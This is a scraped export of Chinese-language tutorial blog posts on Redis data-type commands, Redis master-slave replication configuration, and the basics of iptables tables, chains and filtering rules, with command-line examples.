set a\r(integer) 0\r127.0.0.1:6379\u0026gt; sismember set b\r(integer) 1\rsrandmember：返回元素中指定个数的随机元素\n语法 srandmember key [count]\n127.0.0.1:6379\u0026gt; srandmember set 2\r1) \u0026quot;d\u0026quot;\r2) \u0026quot;b\u0026quot;\rscard返回元素中的个数\n127.0.0.1:6379\u0026gt; scard set\r(integer) 3\r移动集合内元素 smove：将source里的member移动到destination集合中\n语法：SMOVE source destination member\n127.0.0.1:6379\u0026gt; keys *\r(empty list or set)\r127.0.0.1:6379\u0026gt; sadd set a b c d e\r(integer) 5\r127.0.0.1:6379\u0026gt; smove set tmp e\r(integer) 1\r127.0.0.1:6379\u0026gt; keys *\r1) \u0026quot;set\u0026quot;\r2) \u0026quot;tmp\u0026quot;\r127.0.0.1:6379\u0026gt; smembers tmp\r1) \u0026quot;e\u0026quot;\r127.0.0.1:6379\u0026gt; smembers set\r1) \u0026quot;c\u0026quot;\r2) \u0026quot;b\u0026quot;\r3) \u0026quot;a\u0026quot;\r4) \u0026quot;d\u0026quot;\r“b”是这个集合的成员,而“b”不是。集合特别适合表现对象之间的关系。例如用Redis集合可以很容易实现标签功能。\n下面是一个简单的方案:对每个想加标签的对象,用一个标签ID集合与之关联,并且对每个已有的标签,一组对象ID与之关联。\n例如假设我们的新闻ID=1000被加了三个tag 1,2,5就可以设置下面两个集合\n127.0.0.1:6379\u0026gt; sadd news:1000:tags 1\r(integer) 1\r127.0.0.1:6379\u0026gt; sadd news:1000:tags 2\r(integer) 1\r127.0.0.1:6379\u0026gt; sadd news:1000:tags 5\r(integer) 1\r127.0.0.1:6379\u0026gt; smembers news:1000:tags\r1) \u0026quot;1\u0026quot;\r2) \u0026quot;2\u0026quot;\r3) \u0026quot;5\u0026quot;\r而有些看上去并不简单的操作仍然能使用相应的redis命令轻松实现。例如我们也许想获得一份同时拥有标签1,2,10和27的对象列表。这可以用SINTER命令来做,他可以在不同集合之间取出交集。\ntags:1:obj tags:2:obj tags:5:obj tags:27:obj\n127.0.0.1:6379\u0026gt; smembers test1\r1) \u0026quot;1\u0026quot;\r2) \u0026quot;2\u0026quot;\r3) \u0026quot;3\u0026quot;\r127.0.0.1:6379\u0026gt; smembers test4\r1) \u0026quot;1\u0026quot;\r2) \u0026quot;2\u0026quot;\r3) \u0026quot;9\u0026quot;\r127.0.0.1:6379\u0026gt; sinter test1 test4\r1) \u0026quot;1\u0026quot;\r2) \u0026quot;2\u0026quot;\r集合计算 创建一个集合\n127.0.0.1:6379\u0026gt; sadd A 1 2 3 4 5\r(integer) 5\r127.0.0.1:6379\u0026gt; sadd B 1 3 4 5\r(integer) 4\r127.0.0.1:6379\u0026gt; sadd C 1 2 6 7 8 9\r(integer) 6\rsinter：取出指定集合内的交集\n127.0.0.1:6379\u0026gt; sinter A B #\u0026lt;==取出A B两个集合中的交集\r1) \u0026quot;1\u0026quot; 2) \u0026quot;3\u0026quot;\r3) \u0026quot;4\u0026quot;\r4) \u0026quot;5\u0026quot;\r127.0.0.1:6379\u0026gt; sinter A B C\r1)\u0026quot;1\u0026quot;\rsinterstore：将多个集合的交集放入另一个集合内\n127.0.0.1:6379\u0026gt; sinterstore tmp A B #\u0026lt;== 将A B集合中的交集放置在tmp集合中\r2)(integer) 4\r3)127.0.0.1:6379\u0026gt; smembers tmp\r4)1) \u0026quot;1\u0026quot;\r5)2) \u0026quot;3\u0026quot;\r6)3) \u0026quot;4\u0026quot;\r7)4) \u0026quot;5\u0026quot;\rsunion获得多个集合的并集\n127.0.0.1:6379\u0026gt; sunion A B\r1) \u0026quot;1\u0026quot;\r2) \u0026quot;2\u0026quot;\r3) \u0026quot;3\u0026quot;\r4) \u0026quot;4\u0026quot;\r5) \u0026quot;5\u0026quot;\rsdiff获得多个集合的差\n127.0.0.1:6379\u0026gt; sdiff A B\r1) \u0026quot;2\u0026quot;\r有序集合 集合是使用频率很高的数据类型,但是…对许多问题来说他们也有点儿太不讲顺序了；因此Redis1.2引入了有序集合。他和集合非常相似,也是二进制安全的字符串集合,但是这次带有关联的score,以及一个类似lrange的操作可以返回有序元素,此操作只能作用于有序集合,它就是,zrange命令。\n基本上有序集合从某种程度上说是SQL世界的索引在Redis中的等价物。例如在上面提到的reddit.com例子中,并祥有提到如何根据用户投票和时间因素将新闻组合生成首页。我们将看到有序集合如何解决这个问题,但最好先从更简单的事情开始,阐明这个高级数据类型是如何工作的.让我们添加几个黑客,并将他们的生日作为\u0026quot;score\u0026quot;。\n添加并查看有序集合 添加一个或多个成员到一个集合,如果这个成员存在,则更新其排序分数\n语法：ZADD key [NX|XX] [CH] [INCR] score member [score member \u0026hellip;]\n选项详解\n参数 解释 XX 仅更新已经存在的元素。不要添加元素。 NX 不要更新现有的元素。始终添加新元素。 CH 从添加的新元素的数量修改返回值,改变元素的总数（CH是更改的缩写）。已更改的元素是添加的新元素,已经存在的元素已更新。所以在命令行中指定的具有与过去相同的分数的元素不计算在内。注意：通常,ZADD的返回值仅计算添加的新元素的数量。 INCR 当指定此选项时,ZADD的行为就像ZINCRBY。在此模式下只能指定一个记分元素对。 创建一个集合\n127.0.0.1:6379\u0026gt; zadd hacker 1953 zhangfei 1963 zhaoyun 1989 wangping 1992 zhugeliang 1945 liubei\r(integer) 5\r127.0.0.1:6379\u0026gt; zadd hacker 100 zhugeliang\r(integer) 0\r127.0.0.1:6379\u0026gt; zrange hacker 0 -1\r1) \u0026quot;zhugeliang\u0026quot;\r2) \u0026quot;liubei\u0026quot;\r3) \u0026quot;zhangfei\u0026quot;\r4) \u0026quot;zhaoyun\u0026quot;\r5) \u0026quot;wangping\u0026quot;\r查看某个元素在集合内的位置\n127.0.0.1:6379\u0026gt; zscore code_lag py\r\u0026quot;4\u0026quot;\r对有序集合采说,按生日排序返回这些数据易如反掌,因为他们已经是有序的。有序集合是通过一个dual-ported数据结构实现的,它包含一个精简的有序列表和一个hash table,因此添加一个元素的时间复杂度是O(log(N))。这还行,但当我们需要访问有序的元素时,Redis不必再做任何事情,它已经是有序的了。\n对集合的值排序 通过索引查看一个有序集合的范围\n127.0.0.1:6379\u0026gt; zrange hacker 0 -1 withscores #\u0026lt;==打印score\r1) \u0026quot;liubei\u0026quot;\r2) \u0026quot;1945\u0026quot;\r3) \u0026quot;zhangfei\u0026quot;\r4) \u0026quot;1953\u0026quot;\r5) \u0026quot;zhaoyun\u0026quot;\r6) \u0026quot;1988\u0026quot;\r7) \u0026quot;wangping\u0026quot;\r8) \u0026quot;1989\u0026quot;\r9) \u0026quot;zhugeliang\u0026quot;\r10) \u0026quot;1992\u0026quot;\r通过指定索引范围查看有序集合列表（倒序）\n127.0.0.1:6379\u0026gt; zrevrange hacker 0 -1 withscores\r1) \u0026quot;zhugeliang\u0026quot;\r2) \u0026quot;1992\u0026quot;\r3) \u0026quot;wangping\u0026quot;\r4) \u0026quot;1989\u0026quot;\r5) \u0026quot;zhaoyun\u0026quot;\r6) \u0026quot;1988\u0026quot;\r7) \u0026quot;zhangfei\u0026quot;\r8) \u0026quot;1953\u0026quot;\r9) \u0026quot;liubei\u0026quot;\r10)\u0026quot;1945\u0026quot;\r查看集合中的元素个数 返回有序集合中元素的个数\n127.0.0.1:6379\u0026gt; zcard hacker (integer) 8\r返回min,max包括极值\n127.0.0.1:6379\u0026gt; zcount hacker 1950 2000\r(integer) 7\r127.0.0.1:6379\u0026gt; zcount hacker (1950 (2000 #\u0026lt;==不包括极值的用法\r(integer) 4\r查找集合区间的元素 zrangebysocre：返回有序集合key的分数min与max之间的所有元素（等于min或max）。这些元素被认为是从低到高的顺序排列。min和max可以是-inf(无穷)和+inf(正无穷)，可以不需要知道的有序集合最高或最低score来获得元素。\n获取1950年之前（两个极值也包含）出生的人\n127.0.0.1:6379\u0026gt; zrangebyscore hacker -inf 1950 withscores\r1) \u0026quot;liubei\u0026quot;\r2) \u0026quot;1945\u0026quot;\r3) \u0026quot;jiangwie\u0026quot;\r4) \u0026quot;1950\u0026quot;\r返回1950,1970区间内的值\n127.0.0.1:6379\u0026gt; zrangebyscore hacker 1950 1970 withscores\r1) \u0026quot;jiangwie\u0026quot;\r2) \u0026quot;1950\u0026quot; 3) \u0026quot;zhangfei\u0026quot;\r4) \u0026quot;1953\u0026quot; 使用)返回 1950,2000区间内的值\n127.0.0.1:6379\u0026gt; zrangebyscore hacker (1950 (2000 withscores\r1) \u0026quot;zhangfei\u0026quot;\r2) \u0026quot;1953\u0026quot;\r3) \u0026quot;zhaoyun\u0026quot;\r4) \u0026quot;1988\u0026quot;\r5) \u0026quot;wangping\u0026quot;\r6) \u0026quot;1989\u0026quot;\r7) \u0026quot;zhugeliang\u0026quot;\r8) \u0026quot;1992\u0026quot;\r使用limit返回指定区间内的值\n127.0.0.1:6379\u0026gt; zrangebyscore hacker -inf +inf withscores limit 0 3\r1) \u0026quot;liubei\u0026quot;\r2) \u0026quot;1945\u0026quot;\r3) \u0026quot;jiangwie\u0026quot;\r4) \u0026quot;1950\u0026quot;\r5) \u0026quot;zhangfei\u0026quot;\r6) \u0026quot;1953\u0026quot;\rzremrangebyscore这个名字虽然不算好,但他却非常有用,还会返回已删除的元素数量。\n回到Reddit的例子，现在我们有个基于有序集合的像样方案来生成首页。用一个有序集合来包含最近几天的新闻(用zremrangebyscore不时的删除旧新闻).用一个后台任务从有序集合中获取所有元素,根据用户投票和新闻时间计算score,然后用新闻ID和scores关联生成reddit.home.page有序集合.要显示首页,我们只需闪电般的调用ZRANGE不时的从reddit.home.page有序集合中删除过旧的新闻也是为了让我们的系统总是工作在有限的新闻集合之上。 更新有序集合的scores.\n结束这篇指南之前还有最后一个小贴士.有序集合scores可以在任何时候更新。只要用ZADD对有序集合内的元素操作就会更新它的score(和位置),时间复杂度是O(log(N)),因此即使大量更新,有序集合也是合适的。其中N是排序集合中的元素数，M是返回元素的数量。如果M是常数（例如，总是用LIMIT来询问前10个元素)，可以考虑O(log=(N))。\n计算交并集 计算由numkeys指定个数的key的的交集，并将结果存储在其中destination\n127.0.0.1:6379\u0026gt; zadd k1 1 a 2 b 3 c\r(integer) 3 #\u0026lt;==a b c相当于数组的key 1 2 3相当于数组的值\r127.0.0.1:6379\u0026gt; zadd k2 10 a 20 b 30 c\r(integer) 3 127.0.0.1:6379\u0026gt; zinterstore tmp 1 k1 k2\r(error) ERR syntax error #\u0026lt;==指定numkeys的数量和传参数量不一致会提示语法错误\r127.0.0.1:6379\u0026gt; zinterstore tmp 2 k1 k2\r(integer) 3\r127.0.0.1:6379\u0026gt; zrange tmp 0 -1 withscores\r1) \u0026quot;a\u0026quot; #\u0026lt;==可以看出默认的聚合方法是sum\r2) \u0026quot;11\u0026quot;\r3) \u0026quot;b\u0026quot;\r4) \u0026quot;22\u0026quot;\r5) \u0026quot;c\u0026quot;\r6) \u0026quot;33\u0026quot;\r127.0.0.1:6379\u0026gt; zinterstore tmp 2 k1 k2 weights 2 1 aggregate sum\r(integer) 3 #\u0026lt;==指定权重计算两个之间key之间的交集\r127.0.0.1:6379\u0026gt; zrange tmp 0 -1 withscores\r1) \u0026quot;a\u0026quot; 2) \u0026quot;12\u0026quot; #\u0026lt;==k1 a=1权重为2 就等于2x1+10=12 3) \u0026quot;b\u0026quot;\r4) \u0026quot;24\u0026quot;\r5) \u0026quot;c\u0026quot;\r6) \u0026quot;36\u0026quot;\rhash hash能够存储一个key对多个属性的数据 如：user.username user.password\n设置key中的域与值 hset：将key中的field域设置为value，如果field域存在则覆盖原value，不存在则添加\n127.0.0.1:6379\u0026gt; hset user1 name zhangsan\r(integer) 1\r127.0.0.1:6379\u0026gt; hset user1 age 12\r(integer) 1\r127.0.0.1:6379\u0026gt; hset user1 gender male\r(integer) 1\rhmset：给key设置多个field域与值\n127.0.0.1:6379\u0026gt; hmset user2 name lisi age 11 gender female\rOK\r获得key中的域和值 hget：返回key中一个域的值\n127.0.0.1:6379\u0026gt; hget user1 name\r\u0026quot;zhangsan\u0026quot;\rhgetall：返回key中所有域和值\n127.0.0.1:6379\u0026gt; hgetall user1\r1) \u0026quot;name\u0026quot;\r2) \u0026quot;zhangsan\u0026quot;\r3) \u0026quot;age\u0026quot;\r4) \u0026quot;12\u0026quot;\r5) \u0026quot;gender\u0026quot;\r6) \u0026quot;male\u0026quot;\rhmget：返回key中多个值\n127.0.0.1:6379\u0026gt; hmget user1 name age\r1) \u0026quot;zhangsan\u0026quot;\r2) \u0026quot;12\u0026quot;\rhkeys：返回key中的所有域\n127.0.0.1:6379\u0026gt; hkeys user1\r1) \u0026quot;age\u0026quot;\r2) \u0026quot;gender\u0026quot;\r3) hvals：返回key中的所有域的值\n127.0.0.1:6379\u0026gt; hvals user1\r1) \u0026quot;12\u0026quot;\r2) \u0026quot;male\u0026quot;\r删除key hdel：删除key中一个或多个域\n127.0.0.1:6379\u0026gt; hdel user1 name\r(integer) 1\r127.0.0.1:6379\u0026gt; hgetall user1\r1) \u0026quot;age\u0026quot;\r2) \u0026quot;12\u0026quot;\r3) \u0026quot;gender\u0026quot;\r4) \u0026quot;male\u0026quot;\r查看域信息 hlen：返回key中域的个数\n127.0.0.1:6379\u0026gt; hlen user1\r(integer) 2\rhexists：查看key中是否存在某个域\n127.0.0.1:6379\u0026gt; hexists user1 name\r(integer) 0\r127.0.0.1:6379\u0026gt; hexists user1 age\r(integer) 1\rhstrlen：返回key中域的值的长度\n127.0.0.1:6379\u0026gt; HSTRLEN user2 gender\r(integer) 6\rhash的原子操作 hincrby：对域中的值增长value个(单位整型)\n语法：hincrby key field increment\n127.0.0.1:6379\u0026gt; hget user1 age\r\u0026quot;14\u0026quot;\r127.0.0.1:6379\u0026gt; hincrby user1 age 2\r(integer) 16\r127.0.0.1:6379\u0026gt; hget user1 age\r\u0026quot;16\u0026quot;\rhincrbyfloat：对域中的值增长value(单位浮点型)\n127.0.0.1:6379\u0026gt; hincrbyfloat user1 age 0.3\r\u0026quot;16.3\u0026quot;\r127.0.0.1:6379\u0026gt; hget user1 age\r\u0026quot;16.3\u0026quot;\r127.0.0.1:6379\u0026gt; hincrbyfloat user1 age -2 #\u0026lt;==减少用负数即可\r\u0026quot;14.3\u0026quot;\rbitMap 可实现用很小的内存实现高效的存储。\nHyperLogLog 超小内存唯一值计数。 12k来实现唯一值得计数\nGEO 基于地理信息位置定位\n","permalink":"https://www.oomkill.com/2016/11/redis-datatype/","summary":"","title":"redis数据类型"},{"content":"Replication的工作原理 设置一个Slave，无论是第一次还是重连到Master，它都会发出一个sync命令。当Master收到sync命令之后，会做两件事：\nMaster执行BGSAVE，即在后台保存数据到磁盘（rdb快照文件）。 Master同时将新收到的写入和修改数据集的命令存入缓冲区（非查询类）。 当Master在后台把数据保存到快照文件完成之后，把这个快照传送给Slave，而Slave则把内存清空后，加载该文件到内存中。而Master也会把此前收集到缓冲区中的命令，通过Reids命令协议形式转发给Slave，Slave执行这些命令，实现和Master的同步。Master/Slave此后会不断通过异步方式进行命令的同步。\n注：在redis2.8之前，主从之间一旦发生重连都会引发全量同步操作。但在2.8之后版本，也可能是部分同步操作。\n部分复制 2.8后，当主从之间的连接断开之后，他们之间可以采用持续复制处理方式代替采用全量同步。Master端为复制流维护一个内存缓冲区（in-memory backlog），记录最近发送的复制流命令；同时，Master和Slave之间都维护一个复制偏移量(replication offset)和当前Master服务器ID（Master run id）。当网络断开，Slave尝试重连时：\n如果MasterID相同（即仍是断网前的Master服务器），并且从断开时到当前时刻的历史命令依然在Master的内存缓冲区中存在，则Master会将缺失的这段时间的所有命令发送给Slave执行，然后复制工作就可以继续执行了\n否则，依然需要全量复制操作。\nRedis 2.8 的这个部分重同步特性会用到一个新增的PSYNC内部命令， 而 Redis 2.8以前的旧版本只有SYNC命令，不过，只要从服务器是Redis 2.8或以上的版本，它就会根据主服务器的版本来决定到底是使用 PSYNC还是SYNC。 如果主服务器是 Redis 2.8 或以上版本，那么从服务器使用 PSYNC 命令来进行同步。 如果主服务器是 Redis 2.8 之前的版本，那么从服务器使用 SYNC 命令来进行同步。\nredis主从同步特点 一个Master可以有多个Slave。 Redis使用异步复制。从2.8开始，Slave会周期性（每秒一次）发起一个ack确认复制流（replication stream）被处理进度； 不仅主服务器可以有从服务器， 从服务器也可以有自己的从服务器， 多个从服务器之间可以构成一个图状结构； 复制在Master端是非阻塞模式的，这意味着即便是多个Slave执行首次同步时，Master依然可以提供查询服务； 复制在Slave端也是非阻塞模式的：如果你在redis.conf做了设置，Slave在执行首次同步的时候仍可以使用旧数据集提供查询；你也可以配置为当Master与Slave失去联系时，让Slave返回客户端一个错误提示； 当Slave要删掉旧的数据集，并重新加载新版数据时，Slave会阻塞连接请求（一般发生在与Master断开重连后的恢复阶段）； 复制功能可以单纯地用于数据冗余（data redundancy），也可以通过让多个从服务器处理只读命令请求来提升扩展性（scalability）： 比如说， 繁重的 SORT 命令可以交给附属节点去运行。 可以通过修改Master端的redis.config来避免在Master端执行持久化操作（Save），由Slave端来执行持久化。 redis replication配置文件详解 slaveof [masterip] [masterport] #←该redis为slave ip和port是master的ip和port\rmasterauth \u0026lt;master-password\u0026gt; #←如果master设置了安全密码，此处为master的安全密码\rslave-serve-stale-data yes#←当slave丢失master或同步正在进行时，如果发生对slave的服务请求：\rslave-serve-stale-data no #←slave返回client错误:\u0026quot;SYNC with master in progress\u0026quot;\rslave-serve-stale-data yes #←slave依然正常提供服务\rslave-read-only yes #←设置slave不可以写数据，只能用于同步\rrepl-ping-slave-period 10 #←发送ping到master的时间间隔\rrepl-timeout 60 #←IO超时时间\rrepl-backlog-size 1mb #←backlog的大小，当从库连接不到主库时，backlog的队列能放多少\rrepl-backlog-ttl 3600 #←backlog的生命周期\rmin-slaves-max-lag 10 #←延迟小于min-slaves-max-lag秒的slave才认为是健康的slave\r# 当master不可用,Sentinel会根据slave的优先级选举一个master。\r# 最低的优先级的slave,当选master.而配置成0,永远不会被选举\rslave-priority 100 配置Replication 当前生效：在命令行输入以下命令\nredis-cli slaveof 127.0.0.1 6379\r永久生效：修改配置文件\u0026quot;slaveof\u0026quot;选项\nslaveof [masterip] [masterport]\rslaveof 127.0.0.1 6379\r这样就可以保证Redis_6380服务程序在每次启动后都会主动建立与Redis_6379的Replication连接了。\n查看从库的同步情况\n127.0.0.1:6380\u0026gt; MONITOR #←监听服务器实时收到的所有请求\rOK\r1492710733.401532 [0 127.0.0.1:6379] \u0026quot;PING\u0026quot; #← 从库会ping主库\r1492710743.510808 [0 127.0.0.1:6379] \u0026quot;PING\u0026quot;\r1492711152.901232 [0 127.0.0.1:6379] \u0026quot;sadd\u0026quot; \u0026quot;web_site\u0026quot; \u0026quot;www.baidu.com\u0026quot; \u0026quot;www.google.com\u0026quot; \u0026quot;www.qq.com\u0026quot;\r获取有关服务器的信息和统计信息\n127.0.0.1:6380\u0026gt; info Replication\rReplication\rrole:slave\rmaster_host:127.0.0.1\rmaster_port:6379\rmaster_link_status:up\rmaster_last_io_seconds_ago:9\rmaster_sync_in_progress:0\rslave_repl_offset:8999\rslave_priority:100\rslave_read_only:1\rconnected_slaves:0\rmaster_repl_offset:0\rrepl_backlog_active:0\rrepl_backlog_size:1048576\rrepl_backlog_first_byte_offset:0\rrepl_backlog_histlen:0\r当前主从同步存在的问题 由于master和slave服务器不是Redis自动选举产生，需要人工参与，因此主从倒换无法自动完成。这样就存在一个问题，什么时候以及由谁来触发倒换。redis2.8的master和slave服务器是Redis自动选举产生了。\nredis高可用 http://www.cnblogs.com/Xrinehart/p/3501372.html\n","permalink":"https://www.oomkill.com/2016/11/redis-replication/","summary":"","title":"redis主从复制工作原理"},{"content":"1 防火墙实战 关闭两项功能：\nselinux（生产中也是关闭的），ids入侵检测，MD5指纹将。系统所有核心文件全部做指纹识别，将指纹留下，将来出问题，一看就知道那个文件被改过。 iptables（生产中看情况，内网关闭，外网打开），大并发的情况，不能开iptables，影响性能。 使用防火墙就不如不使用防火墙，不使用防火墙的前提是不给外网ip，工作中要少给外网服务器ip，这样防火墙使用率较低，防火墙使用也很消耗资源 安全优化：\n尽可能不给服务器配置外网IP。可以通过代理转发或者通过防火墙映射。 并发不是特别大情况再外网IP的环境，要开启iptables防火墙 http://edu.51cto.com/course/course_id-772.html\n学好iptables基础：\nOSI7层模型以及不同层对应那些协议？ TCP/IP三次握手，四次断开的过程，TCP HEADER。 常用的服务端口要了如指掌。 1.1 iptables防火墙简介 Netfilter/iptables(以下简称iptables)是unix/linux自带的一款优秀且开放源代码的完全自由的基于包过滤的防火墙工具，它的功能十分强大，使用非常灵活，可以对流入和流出的服务器数据包进行很精细的控制。特别是他可以在一台非常低的硬件配置下跑的非常好（赛扬500MHZ 64M内存的情况部署网关防火墙）提供400人的上网服务四号==不逊色企业级专业路由器防火墙==。iptables+zebra+squid\niptables是linux2.4及2.6内核中集成的服务。其功能与安全性比其老一辈ipwadin ipchains强大的多（长江水后浪推前浪），iptables主要工作在OSI七层的二、三、四层，如果重新编译内核，iptables也可以支持7层控制（squid代理+iptables）。\n1.2 iptables名词和术语 容器：包含或者说属于关系\n什么是容器？\n​\t在iptables里，就是用老描述这种包含或者说属于的关系\n什么是Netfilter/iptables?\n​\tNetfilter是表（tables）的容器\n什么是表（tables）？\n​\t表是链的容器，所有的链（chains）都属于其对应的表。\n什么是链（chains）？\n​\t链（chains）是规则的容器\n什么是规则（policy）\n​\tiptables一系列过滤信息的规范和具体方法条款\niptables抽象和实际比喻对比表\r| Netfilter | tables | chains | policy |\r| --------- | ---------- | ------------ | -------------------- |\r| 一栋楼 | 楼里的房子 | 房子里的柜子 | 柜子里衣服的摆放规则 |\r1.3 iptables工作流程 iptables是采用数据包过滤机制工作的，所以他会对请求的数据包包头数据进行分析，并根据我们预先设定的规则进行匹配来决定是否可以进入主机。\n数据包的流向是从左向右的!\niptables工作小结：\n防火墙是一层层过滤的。实际是按照配置规则的顺序从上到下，从前到后进行过滤的。\r如果匹配上规则，即明确表明是阻止还是通过，此时数据包就不在向下匹配新规则了。\r如果所有规则中没有明确表明是阻止还是通过这个数据包，也就是没有匹配上规则，向下进行匹配，知道匹配默认规则得到明确的阻止还是通过。\r防火墙的默认规则是对应链的所有的规则执行完才会执行的。\r提示：\niptables防火墙规则的执行顺序默认从前到后（从上到下）依次执行，遇到匹配的规则就不在继续向下检查，只有遇到不匹配的规则才会继续向下进行匹配。\n重点：匹配上了拒绝规则也是匹配，这点要多注意。\niptables -A INPUT -p tcp --dport 3306 -j DROP\riptables -A INPUT -p tcp --dport 3306 -j ACCEPT\r$ iptables -nL\rChain INPUT (policy ACCEPT) DROP tcp -- 0.0.0.0/0 0.0.0.0/0 tcp dpt:3306 ACCEPT tcp -- 0.0.0.0/0 0.0.0.0/0 tcp dpt:3306 Chain FORWARD (policy ACCEPT)\rtarget prot opt source destination REJECT all -- 0.0.0.0/0 0.0.0.0/0 reject-with icmp-host-prohibited Chain OUTPUT (policy ACCEPT)\rtarget prot opt source destination 此时 ``telnet10.0.0.148 3306是不通的，原因就是telnet请求已匹配上了拒绝规则iptables -A INPUT -p tcp \u0026ndash;dport 3306 -j DROP,因此，不会在找下面的规则匹配了。如果希望telnet 10.0.0.148 3306 连通，可以吧ACCEPT规则中的-A改为-I，即 iptables -I INPUT -p tcp \u0026ndash;dport 3306 -j ACCEPT` 把允许规则放于INPUT链第一行生效\n==默认规则是所有的规则执行完才会执行的==。\n1.4 iptables表（tables）和链（chains） 默认情况下，iptables根据功能和表的定义划分包含三个表，filter nat mangle，其每个表有包含不同的操作链（chains）。\n下面的表格展示了表和链的对应关系\n表\r链（chains）\rINPUT\rFORWARD\rOUTPUT\rPREROUTING\rPOSTROUTING\rFilter\rNAT\rMangle\r注：绿色表示有， 灰色表示无\r**提示：所有链名要大写**\r表名\r作用\rfilter\r强调主要和主机自身有关，真正负责主机防火墙功能的（过滤流入流出主机的数据包）。filter表是iptables默认使用的表。这个表定义了三个链（chains）。企业工作场景：主机防火墙。\rnat\r负责网络地址转换，即来源与目的IP地址和port的转换。应用：和主机本身无关。一般用于局域网共享上网或者特殊的端口转换服务相关。\nNAT功能一般企业工作场景\n1. 用于做企业路由（zebra）或网关（iptables），共享上网（POSTROUTING）\n2. 做内部外部IP地址一对一映射（dmz），硬件防火墙映射IP到内部服务器，ftp服务，（PREROUTING）\n3. web，单个端口的映射，直接映射80端口（PREROUTING）。这个表示定义了三个链（chains），nat功能就相当于网络的acl控制。和网络交换机acl类似。\rMangle\r主要负责修改数据包中特殊的路由标记，如TTL，TOS，NARK等。这个表定义了5个链\r链名\r作用\rINPUT\r负责过滤所有目标地址是本机地址的数据包。通俗的讲，就是过滤进入主机的数据包\rFORWAED\r负责转发流经主机的数据包。起转发的作用，和NAT关系很大，后面会详细讲LVS NAT模式。\rPREROUTING\r在数据包到达防火墙时进行路由判断之前执行的规则，作用是改变数据包的目的地址、目的端口等。（通俗比喻，就是收信时，根据规则重写收件人的地址，这看上去很不地道啊！）\r例如：把公网IP：124.42.60.113映射到居于玩分10.0.0.19服务器上。如果是web服务，可以把80端转为局域网的服务器上9000端口。\rPOSTROUTING\r在数据包离开防火墙时进行路由判断之后执行的规则，作用改变数据包的源地址、源端口等。（通俗比喻，就是寄信时，写好发件人的地址，要让人家回信时能后有地址可回。）例如：我们在现在的笔记本和虚拟机都是10.0.0.0/24，就是楚王的时候被我们企业路由器把源地址改成了公网地址了。生产应用：局域网共享上网。\r由于这个表与特殊标记相关，一般情况下，我们用不到这个mangle表，这里就不做详细介绍了。给初学者的建议：新手学习时最好抓住一个主线向前学，能够跑通路就好，不一定要面面俱到，不然很容易陷进去，而苦恼，甚至失去学习的兴趣\n1.5 iptables表和链的流程图 下面这张图清晰的描绘了netfilter对包的处理流程\n为了更好的学习将上图简化为如下\n图1-1 iptables简化流程图\r强调：上图可以看作地铁1 2号线来\r1号线：主要是NAT功能，\n​\t企业案例：\n​\t1. 局域网上网共享（路由和网关），使用NAT的POSTROUTING链\n​\t2. 外部IP和端口映射为内部IP和端口（DMZ功能），使用NAT的PREROUTING链。\n2号线：主要是FILTER功能，即防火墙功能 FILTER INPUT FORWARD\n​\t企业案例：\n​\t主要应用就是主机服务器防火墙，使用FILTER的INPUT链\n","permalink":"https://www.oomkill.com/2016/10/ch1-iptables-introduction/","summary":"","title":"ch1 iptables介绍"},{"content":"2 iptables命令帮助信息 有问题查帮助，下面是很全的帮助信息（必须拿下它）\n$ iptables -h\r$ iptables -nL\r# INPUT链 ACCEPT默认允许决策 Chain INPUT (policy ACCEPT)\rtarget prot opt source destination ACCEPT all -- 0.0.0.0/0 0.0.0.0/0 state RELATED,ESTABLISHED ACCEPT icmp -- 0.0.0.0/0 0.0.0.0/0 ACCEPT all -- 0.0.0.0/0 0.0.0.0/0 ACCEPT tcp -- 0.0.0.0/0 0.0.0.0/0 state NEW tcp dpt:22 REJECT all -- 0.0.0.0/0 0.0.0.0/0 reject-with icmp-host-prohibited Chain FORWARD (policy ACCEPT)\rtarget prot opt source destination REJECT all -- 0.0.0.0/0 0.0.0.0/0 reject-with icmp-host-prohibited Chain OUTPUT (policy ACCEPT)\rtarget prot opt source destination 2.1 启动和查看iptables状态 /etc/init.d/iptables start\rsystemctl start iptables\r实例演示1：\n$ /etc/init.d/iptables status\r表格：filter\rChain INPUT (policy ACCEPT)\rnum target prot opt source destination 1 ACCEPT all -- 0.0.0.0/0 0.0.0.0/0 state RELATED,ESTABLISHED 2ACCEPT icmp -- 0.0.0.0/0 0.0.0.0/0 num target prot opt source destination $ iptables -nL\rChain INPUT (policy ACCEPT)\rtarget prot opt source destination ACCEPT all -- 0.0.0.0/0 0.0.0.0/0 state RELATED,ESTABLISHED 提示：如果遇到下面的无法启动IPTABLES的情况\n$ /etc/init.d/iptables start\r$ /etc/init.d/iptables start\r$ /etc/init.d/iptables status\rFirewall is stopped\r解决：setup -\u0026gt; Firewall Configuration -\u0026gt; enable\nIptables默认加载的内核模块\n$ lsmod|egrep \u0026quot;nat|filter\u0026quot; iptable_filter 2793 1 ip_tables 17831 1 iptable_filter\r加载如下模块到linux内核\nmodprobe ip_tables \\\rmodprobe iptable_filter \\\rmodprobe iptable_nat \\\rmodprobe ip_conntrack \\\rmodprobe ip_conntrack_ftp \\\rmodprobe ip_nat_ftp \\\rmodprobe ipt_state\r2.2 iptables参数 参数选项 注释说明 -n num 数字 -L 列表 -F 清除所有规则，不会处理默认的规则 -X 删除用户自定义的链 -Z 链的计数器清零 -t 指定表 -A 添加协议 -p 协议（all tcp udp Icmp）默认为all \u0026ndash;dport 目的端口 \u0026ndash;sport 源端口 -j 处理的行为（ACCEPT接受 DROP丢弃 REJECT拒绝） -D 删除规则 -A 添加规则到指定链的结尾 -I 添加规则到指定链的开头 -s 指定源地址 \u0026ndash;line-numbers 显示序号 -i \u0026lt;网络接口\u0026gt; 指定数据包进入本机的网络接口。 -o \u0026lt;网络接口\u0026gt; 指定数据包要离开本机所使用的网络接口。 2.3 清除默认规则 iptables -F 清除所有规则，不会处理默认的规则 iptables -X 删除用户自定义的链 iptables -Z 链的计数器清零 实例演示2：\niptables -F == iptables --flush\riptables -X == iptables --delete-chain\riptables -Z\r禁止规则\n1.禁止ssh端口\n(1) 找出当前机器SSH端口\n$ netstat -lntup|grep ssh\rtcp 0 0 192.168.1.5:52113 0.0.0.0:* LISTEN 1053/sshd (2) 禁止掉当前SSH端口，这里是52113\niptables -t [table] -[AD] chain rule-specification [options]\r具体命令\niptables -A INPUT -p tcp --dport 52113 -j DROP\riptables -tfilter -A INPUT -p tcp --dport 52113 -j DROP\t注：\n1. iptables默认用的就是filter表，因此，以上两条命令等价。\r2. 其中INPUT DROP要大写\r3. --jump -j target target for rule（may load target 